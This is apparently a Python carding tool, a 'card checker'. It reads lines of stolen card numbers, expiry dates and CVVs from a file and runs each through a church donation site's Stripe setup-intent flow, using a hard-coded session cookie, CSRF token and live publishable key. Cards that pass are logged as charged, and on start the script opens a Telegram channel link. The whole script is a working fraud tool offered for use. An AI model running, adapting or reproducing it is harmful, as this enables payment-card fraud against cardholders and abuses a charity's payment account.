import requests
import webbrowser
webbrowser.open('http://t.me/india_DragonMaster', new=2)
with open('ccs.txt','r') as file:
    for line in file:
        cc_num , cc_mon , cc_year , cc_cvv = line.strip().split('|')



        url = "https://rhub.churchcenter.com/giving/stripe_setup_intent"

        headers = {
            "authority": "rhub.churchcenter.com",
            "method": "POST",
            "path": "/giving/stripe_setup_intent",
            "scheme": "https",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "__stripe_mid=fc3c7872-8b35-4212-91e2-96ee9bbbbf7daa12ca; __stripe_sid=1215a90a-cf03-4351-9bd5-771f38e64b00b4e10a; _ga=GA1.2.1075391559.1719317418; _gid=GA1.2.1487971707.1719317418; _gat_gtag_UA_462630_12=1; church_center_session=eyJhbGciOiJFUzI1NiJ9.eyJqdGkiOiIzMzViOTExNmRhYTI5MGRhNzFiMDRiZWI4NTgyYWFiMSIsImlhdCI6MTcxOTMxNzQyMCwiZXhwIjoxNzIwNTI3MDIwLCJpc3MiOiIvcGNvL3Nlc3Npb24ifQ.n7DJFWCA-5XAViiWyAuDno0yBw-TQy2TaE0rQXj4HWudRZwxboSrQG4_mNxHizpyorPj3jNeu8kvAnWSX4oCKg; _dd_s=rum=0&expire=1719318341661",
            "Origin": "https://rhub.churchcenter.com",
            "Pragma": "no-cache",
            "Referer": "https://rhub.churchcenter.com/giving",
            "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Linux"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Csrf-Token": "ZtZpBNbFS55QZ9sX5e5xpQTTiOEYIDKzdm4mLZDBmi4dEVnrz5-GOPqbPdo8vFEG3RdxyKYu2UOLo_OUithPbA",
            "X-Requested-With": "XMLHttpRequest"
        }

        payload = {
            "person[account_center_id]": "150325644",
            "person[email_address]": "cocomelonsbook@coco.com"
        }

        response = requests.post(url, headers=headers, data=payload)
        response_json = response.json()
        client_secret = response_json['client_secret']
        setup_intent = client_secret.split('_secret')[0]

        url = f'https://api.stripe.com/v1/setup_intents/{setup_intent}/confirm'
        headers = {
    'Authorization': 'Bearer pk_live_11n5R3Tp636QogyTkQpIBCiRjENPZJGH1GQ48z80pfU0T4eIznLJCgfqYYSWIg50dBsruFpHqKYlC2HaOTfQNN1WR00OKzGWd8E',
    'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'client_secret': client_secret,
    'payment_method_data[type]': 'card',
    'payment_method_data[card][number]': cc_num,  # Example card number
    'payment_method_data[card][exp_month]': cc_mon,             # Example expiration month
    'payment_method_data[card][exp_year]': cc_year,            # Example expiration year
    'payment_method_data[card][cvc]': cc_cvv,
    '_stripe_account': 'acct_1HDI41LcbWNkYRU9'
        }
        response = requests.post(url, headers=headers, data=data)
        response_json = response.json()
        status = response_json.get('status')
        if status == 'succeeded':
            print(f'CC: {cc_num}|{cc_mon}|{cc_year}|{cc_cvv} - 1$ CHARGED SUCCESSFULLY✅')
            with open('charged.txt','a') as file:
                file.write(f'CC:{cc_num}|{cc_mon}|{cc_year}|{cc_cvv}/n')   
        else:
            print(f'CC: {cc_num}|{cc_mon}|{cc_year}|{cc_cvv} - FAILED❌')
